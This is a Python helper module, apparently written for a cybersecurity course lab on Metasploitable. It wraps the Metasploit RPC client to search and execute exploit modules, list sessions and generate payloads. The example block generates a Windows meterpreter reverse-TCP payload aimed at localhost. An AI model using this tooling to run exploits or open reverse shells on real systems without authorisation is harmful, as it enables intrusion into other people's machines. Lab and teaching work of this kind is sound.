import shlex

from computerspeak import ComputerSpeak as cs
from target_config import MSF_PASS

try: #im not sure if this is the best way to handle this, but it should work for now. we can always refactor later if we need to.
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError as exc:
    MsfRpcClient = None
    _MSF_IMPORT_ERROR = exc
else:
    _MSF_IMPORT_ERROR = None

csi = cs()
client = None


def _log_action(message):
    """Log an action message using the ComputerSpeak class. This function takes a message as input and uses the ComputerSpeak instance to execute a command that echoes the message. The message is safely quoted using shlex.quote to prevent any issues with special characters or command injection vulnerabilities. This logging mechanism provides a way to track the actions being performed in the Metasploit helper functions."""
    csi.execute_command(f"echo {shlex.quote(message)}")


def _get_client():
    global client
    if MsfRpcClient is None:
        raise RuntimeError(
            "pymetasploit3 is not installed. Install SurzsEnviro/requirements.txt before using Metasploit helpers."
        ) from _MSF_IMPORT_ERROR
    if client is None:
        client = MsfRpcClient(password=MSF_PASS, port=55552, ssl=True)
    return client


def _apply_options(module, options):
    """Apply the given options to the specified Metasploit module. This function iterates over the provided options dictionary and sets each option on the module. If no options are provided, the function simply returns without making any changes."""
    if not options:
        return
    for option, value in options.items():
        module[option] = value



def search_modules(query):
    """ Search for Metasploit modules based on a query string. This function uses the Metasploit client to search for modules that match the provided query. The search results are returned as a list of matching modules, which can be further processed or displayed as needed. The function also logs the search action using the ComputerSpeak class to provide insights into the search process."""
    _log_action(f"Searching for modules related to: {query}")
    searchdata = _get_client().modules.search(query)
    return searchdata


def execute_module(module_type, module_name, options):
    """Execute a specified Metasploit module with the given options. This function uses the Metasploit client to execute a module of the specified type and name, applying the provided options. The results of the module execution are returned, and the action is logged using the ComputerSpeak class to provide insights into the execution process."""
    _log_action(f"Executing module: {module_type}/{module_name} with options: {options}")
    module = _get_client().modules.use(module_type, module_name)
    _apply_options(module, options)
    result = module.execute()
    return result


def list_sessions():
    """List all active Metasploit sessions. This function uses the Metasploit client to retrieve a list of active sessions. The sessions are returned in a structured format, and the action is logged using the ComputerSpeak class to provide insights into the session management process."""
    _log_action("Listing active sessions")
    sessions = _get_client().sessions.list
    return sessions


def get_db_status():
    """Check the status of the Metasploit database. This function uses the Metasploit client to retrieve the current status of the database. The status is returned in a structured format, and the action is logged using the ComputerSpeak class to provide insights into the database management process."""
    _log_action("Checking database status")
    db_status = _get_client().db.status()
    return db_status


def payload_generation(payload_name, options):
    """Generate a Metasploit payload with the specified name and options. This function uses the Metasploit client to create a payload based on the provided name and options. The generated payload is returned, and the action is logged using the ComputerSpeak class to provide insights into the payload generation process."""
    _log_action(f"Generating payload: {payload_name} with options: {options}")
    payload = _get_client().modules.use("payload", payload_name)
    _apply_options(payload, options)
    generated_payload = payload.generate()
    return generated_payload


if __name__ == "__main__":
    # Example usage of the Metasploit helper functions
    try:
        search_results = search_modules("windows")
        print("Search Results:", search_results)

        payload_options = {
            "LHOST": "127.0.0.1",
            "LPORT": 4444
        }
        generated_payload = payload_generation("windows/meterpreter/reverse_tcp", payload_options)
        print("Generated Payload:", generated_payload)
    except Exception as e:
        print("An error occurred:", e)
#my entire cybersecurity class is metasploitable, so i need this to work lmfao. course work begins in a few hours, and i want to have this ready to go. i will figure it out hey your right! in 3 hours.